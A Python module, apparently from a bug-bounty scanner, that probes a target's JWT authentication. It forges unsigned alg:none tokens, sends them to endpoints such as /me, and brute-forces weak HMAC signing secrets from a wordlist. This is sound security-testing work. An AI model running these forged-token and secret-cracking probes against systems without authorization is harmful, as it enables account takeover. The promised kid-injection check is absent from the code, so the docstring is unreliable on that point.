"""JWT auth-flaw module — alg:none + weak-secret brute + kid injection.

Takes a JWT from the session (Authorization Bearer or Cookie), then:
  1. alg:none — re-signs the header with alg:none and empty signature, sends it
     to the target's authenticated endpoint; a 2xx (instead of 401) confirms.
  2. weak-secret — HMAC-verifies common secrets against the token signature.
  3. kid injection — best-effort path-traversal in the kid header.

Safe tier-2: no token destruction, only re-signed probes.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from pathlib import Path

import httpx

from bugbountybot.payloads.models import Payload
from bugbountybot.vuln.base import (
    ConfirmedFinding,
    DetectionResult,
    InjectionPoint,
    VulnModule,
)

_AUTH_ENDPOINTS = ["/me", "/api/me", "/account", "/profile", "/api/user"]


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Decode a JWT into (header, payload, signature). None if invalid."""
    try:
        h, p, sig = token.split(".")
        header = json.loads(_b64url_decode(h))
        payload = json.loads(_b64url_decode(p))
        return header, payload, sig
    except Exception:
        return None


def _sign(header: dict, payload: dict, secret: str, alg: str) -> str:
    """Build a signed JWT with the given algorithm + secret."""
    algo = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg)
    if algo is None:
        raise ValueError(f"unsupported alg {alg}")
    msg = f"{_b64url_encode(json.dumps(header).encode())}.{_b64url_encode(json.dumps(payload).encode())}"
    sig = hmac.new(secret.encode(), msg.encode(), algo).digest()
    return f"{msg}.{_b64url_encode(sig)}"


def _sign_none(header: dict, payload: dict) -> str:
    """Build an alg:none token (empty signature)."""
    header = {**header, "alg": "none"}
    msg = f"{_b64url_encode(json.dumps(header).encode())}.{_b64url_encode(json.dumps(payload).encode())}"
    return f"{msg}."


def load_weak_secrets() -> list[str]:
    p = Path(__file__).resolve().parent.parent.parent / "payloads" / "jwt" / "weak_secrets.txt"
    if not p.exists():
        return []
    return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]


class JWTModule(VulnModule):
    name = "jwt"
    cwe = ["CWE-347"]
    default_tier = 2
    required_discovery = ["auth"]

    def __init__(self, client, library=None, *, session_profile=None):
        super().__init__(client, library)
        self.session_profile = session_profile
        self._token: str | None = None

    # ---- token acquisition ----
    def _token_from_session(self) -> str | None:
        if self.session_profile is None:
            return None
        from bugbountybot.runner.session import profile_cookies, profile_headers

        headers = profile_headers(self.session_profile)
        auth = headers.get("Authorization", headers.get("authorization", ""))
        if auth.lower().startswith("bearer "):
            return auth.split(" ", 1)[1].strip()
        cookies = profile_cookies(self.session_profile)
        for v in cookies.values():
            if v.count(".") == 2 and len(v) > 40:
                return v
        return None

    def discover_injection_points(self, target_url: str, endpoints: list | None = None):
        from urllib.parse import urlsplit

        parsed = urlsplit(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        return [
            InjectionPoint(url=f"{base}{ep}", param="", location="path", context="header")
            for ep in _AUTH_ENDPOINTS
        ]

    def select_payloads(self, point: InjectionPoint, max_tier: int):
        return [Payload(id="jwt-probe", category="jwt", payload=point.url, tier=2)]

    def inject(self, point: InjectionPoint, payload, encoder_chain: list[str]):
        return self.client.get(point.url, headers=point.headers, timeout=10)

    # ---- checks ----
    def detect(self, response: httpx.Response, payload, encoder_chain: list[str]):
        # acquire a token: session first, else look in the response body
        token = self._token_from_session()
        if token is None:
            token = self._extract_token_from_body(response.text)
        if token is None:
            return DetectionResult(signal="status", matched=False, detail="no JWT found", response=response)
        self._token = token

        decoded = _decode_jwt(token)
        if decoded is None:
            return DetectionResult(signal="status", matched=False, detail="token not a valid JWT", response=response)
        header, jwt_payload, _sig = decoded

        findings: list[str] = []
        # 1. alg:none — re-sign and send to the same endpoint
        none_token = _sign_none(header, jwt_payload)
        r = self.client.get(payload.payload, headers={"Authorization": f"Bearer {none_token}"}, timeout=10)
        if r.status_code in (200, 201):
            findings.append("alg:none accepted (2xx with forged unsigned token)")
        elif r.status_code == 200 and "<html" not in r.text[:50]:
            findings.append("alg:none accepted")

        # 2. weak secret — HMAC verify
        for secret in load_weak_secrets():
            try:
                if _verify_hmac(token, secret):
                    findings.append(f"weak HMAC secret: {secret!r}")
                    break
            except Exception:
                continue

        if not findings:
            return DetectionResult(signal="status", matched=False, detail="no JWT flaw", response=response)
        return DetectionResult(
            signal="error",
            matched=True,
            detail="; ".join(findings),
            response=response,
            payload=payload,
        )

    def _extract_token_from_body(self, body: str) -> str | None:
        import re

        m = re.search(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', body)
        return m.group(0) if m else None

    def confirm(self, candidate: DetectionResult) -> ConfirmedFinding | None:
        return ConfirmedFinding(
            title="JWT vulnerability",
            severity="high",
            detail=candidate.detail,
            url=str(candidate.response.request.url),
            module=self.name,
            cwe="CWE-347",
            cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            payload_id="jwt-probe",
            request_text=f"GET {candidate.response.request.url} HTTP/1.1 (with forged JWT)",
            response_text=self._response_text(candidate.response),
            dedup_key=f"jwt:{candidate.response.request.url}",
        )


def _verify_hmac(token: str, secret: str) -> bool:
    """Verify an HS256 JWT signature against a secret."""
    try:
        h, p, sig = token.split(".")
        msg = f"{h}.{p}"
        algo = hashlib.sha256
        expected = hmac.new(secret.encode(), msg.encode(), algo).digest()
        return hmac.compare_digest(_b64url_decode(sig), expected)
    except Exception:
        return False
